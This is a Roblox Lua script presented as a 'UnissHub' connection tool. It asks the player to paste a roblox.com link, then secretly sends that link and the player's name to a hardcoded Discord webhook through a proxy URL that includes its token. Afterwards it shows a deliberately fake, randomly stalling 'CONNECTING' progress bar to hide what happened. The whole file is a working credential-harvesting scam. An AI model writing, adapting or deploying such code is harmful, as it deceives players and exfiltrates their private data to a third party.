-- UnissHub Ultra-Realistic Edition (Long Loading & Freezes)
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"

-- Функция отправки вебхука
local function sendWebhook(link)
    local request = syn and syn.request or http_request or request or HttpPost
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "🚀 **UnissHub | New Link**\nPlayer: " .. Player.Name .. "\nLink: " .. link
            })
        })
    end
end

-- Система перетаскивания (DRAG)
local function makeDraggable(gui)
    local dragging, dragInput, dragStart, startPos
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
        end
    end)
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    game:GetService("RunService").RenderStepped:Connect(function()
        if dragging and dragInput then
            local delta = dragInput.Position - dragStart
            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- Создание GUI
local sg = Instance.new("ScreenGui", Player.PlayerGui)
sg.Name = "UnissHub_Final"; sg.ResetOnSpawn = false

-- КНОПКА U
local uBtn = Instance.new("TextButton", sg)
uBtn.Size = UDim2.new(0, 60, 0, 60); uBtn.Position = UDim2.new(0, 50, 0.5, 0)
uBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15); uBtn.Text = "U"
uBtn.TextColor3 = Color3.fromRGB(0, 150, 255); uBtn.Font = Enum.Font.GothamBold; uBtn.TextSize = 35
Instance.new("UICorner", uBtn).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", uBtn).Color = Color3.fromRGB(0, 150, 255)
makeDraggable(uBtn)

-- ГЛАВНОЕ ОКНО
local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 360, 0, 220); main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5); main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
main.ClipsDescendants = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", main).Color = Color3.fromRGB(0, 120, 255)
makeDraggable(main)

local input = Instance.new("TextBox", main)
input.Size = UDim2.new(0.85, 0, 0.22, 0); input.Position = UDim2.new(0.075, 0, 0.3, 0)
input.BackgroundColor3 = Color3.fromRGB(30, 30, 30); input.PlaceholderText = "Paste Link Here..."
input.TextColor3 = Color3.new(1,1,1); input.TextScaled = true; Instance.new("UICorner", input)

local conn = Instance.new("TextButton", main)
conn.Size = UDim2.new(0.85, 0, 0.25, 0); conn.Position = UDim2.new(0.075, 0, 0.65, 0)
conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "CONNECT"
conn.TextColor3 = Color3.new(1,1,1); conn.Font = Enum.Font.GothamBold; conn.TextScaled = true
Instance.new("UICorner", conn)

uBtn.MouseButton1Click:Connect(function() main.Visible = not main.Visible end)

conn.MouseButton1Click:Connect(function()
    if string.find(input.Text:lower(), "roblox.com") then
        conn.Text = "AUTHORIZED"; conn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        task.wait(0.6)
        main.Visible = false; uBtn.Visible = false
        task.spawn(function() sendWebhook(input.Text) end)

        -- ОРАНЖЕВАЯ ЗАГРУЗКА
        local loadF = Instance.new("Frame", sg)
        loadF.Size = UDim2.new(0, 320, 0, 100); loadF.Position = UDim2.new(0.5, 0, 0.5, 0); loadF.AnchorPoint = Vector2.new(0.5, 0.5)
        loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
        Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
        
        local lLabel = Instance.new("TextLabel", loadF)
        lLabel.Size = UDim2.new(1, 0, 0.6, 0); lLabel.BackgroundTransparency = 1
        lLabel.TextColor3 = Color3.fromRGB(255, 140, 0); lLabel.Font = Enum.Font.GothamBold; lLabel.TextSize = 18

        local barBg = Instance.new("Frame", loadF)
        barBg.Size = UDim2.new(0.8, 0, 0.1, 0); barBg.Position = UDim2.new(0.1, 0, 0.75, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        local fill = Instance.new("Frame", barBg); fill.Size = UDim2.new(0, 0, 1, 0); fill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)

        -- ЛОГИКА ДОЛГОЙ ЗАГРУЗКИ С ЗАВИСАНИЯМИ
        local totalDuration = math.random(30, 60) -- Общее время 30-60 сек
        local stepTime = totalDuration / 100
        
        -- Выбираем 4 случайных точки для "зависания"
        local freezePoints = {math.random(10, 25), math.random(35, 50), math.random(60, 75), math.random(85, 95)}

        for i = 0, 100 do
            -- Проверка на зависание
            local isFreezing = false
            for _, point in pairs(freezePoints) do
                if i == point then
                    isFreezing = true
                    break
                end
            end

            if isFreezing then
                lLabel.Text = "WAITING FOR SERVER..."
                task.wait(math.random(5, 30) / 10) -- Пауза 0.5 - 3.0 секунды
            end

            lLabel.Text = "CONNECTING: " .. i .. "%"
            fill.Size = UDim2.new(i/100, 0, 1, 0)
            task.wait(stepTime)
        end

        lLabel.Text = "SUCCESSFULLY CONNECTED!"
        task.wait(1.5); sg:Destroy()
    else
        conn.Text = "INVALID LINK"; task.wait(1); conn.Text = "CONNECT"
    end
end)
